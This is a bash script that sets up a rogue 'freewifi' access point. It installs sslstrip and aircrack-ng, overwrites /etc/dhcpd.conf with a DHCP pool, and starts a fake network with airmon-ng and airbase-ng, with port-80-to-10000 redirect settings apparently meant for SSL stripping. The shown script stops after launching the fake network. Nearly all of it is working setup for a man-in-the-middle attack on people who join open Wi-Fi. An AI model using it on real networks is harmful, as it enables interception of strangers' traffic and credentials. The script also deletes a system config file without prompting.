# Requirements
sudo apt install dhcp3-server
sudo apt install -y sslstrip
sudo apt install -y aircrack-ng

rm ./vars.txt
rm /etc/dhcpd.conf

# Read settings and values
read -p " 1/10 Enter subnet mask [192.168.1.0]: " subnet
subnet=${subnet:-192.168.1.0}

read -p " 2/10 Enter netmask mask [24]: " netmask
netmask=${netmask:-255.255.255.0}

read -p "Enter routers [192.168.1.1]: " routers
routers=${routers:-192.168.1.1}

read -p "Enter domain name [freewifi]: " domain_name
domain_name=${domain_name:-freewifi}

read -p "Enter range start ip [192.168.1.2]: " start
start=${start:-192.168.1.2}

read -p "Enter range end ip [192.168.1.40]: " end
end=${end:-192.168.1.40}

read -p "Enter interface [wlan0]" interface
interface=${interface:-wlan0}

read -p "Enter channel [11]" channel
channel=${channel:-11}

read -p "Enter target [192.168.0.1]" target
target=${target:-192.168.0.1}

read -p "Enter monitor interface [mon0]" mon_interface
mon_interface=${mon_interface:-mon0}

read -p "Enter at interface [at0]" at_interface
at_interface=${at_interface:-at0}

read -p "Enter source port [80]" port
port=${port:-80}

read -p "Enter redirect port [10000]" redirect_port
redirect_port=${redirect_port:-10000}


# Save variables
echo "subnet=\"$subnet\"" >> vars.txt
echo "netmask=\"$netmask\"" >> vars.txt
echo "routers=\"$routers\"" >> vars.txt
echo "domain_name=\"$domain_name\"" >> vars.txt
echo "start=\"$start\"" >> vars.txt
echo "end=\"$end\"" >> vars.txt
echo "interface=\"$interface\"" >> vars.txt
echo "channel=\"$channel\"" >> vars.txt
echo "target=\"$target\"" >> vars.txt
echo "mon_interface=\"$mon_interface\"" >> vars.txt
echo "at_interface=\"$at_interface\"" >> vars.txt
echo "port=\"$port\"" >> vars.txt
echo "redirect_port=\"$redirect_port\"" >> vars.txt

# Write config file for dhcpd pool used by access point
echo "authoritative;" >> /etc/dhcpd.conf
echo "default-lease-time 600;" >> /etc/dhcpd.conf
echo "max-lease-time 7200;" >> /etc/dhcpd.conf
echo "subnet $subnet netmask $netmask {" >> /etc/dhcpd.conf
echo "option routers $routers;" >> /etc/dhcpd.conf
echo "option subnet-mask $netmask;" >> /etc/dhcpd.conf
echo "option domain-name \"$domain_name\";" >> /etc/dhcpd.conf
echo "option domain-name-servers $routers;" >> /etc/dhcpd.conf
echo "range $start $end;" >> /etc/dhcpd.conf
echo "}" >> /etc/dhcpd.conf

# Put wifi interface in monitor mode
airmon-ng start $interface
airbase-ng -c $channel -e $domain_name $mon_interface
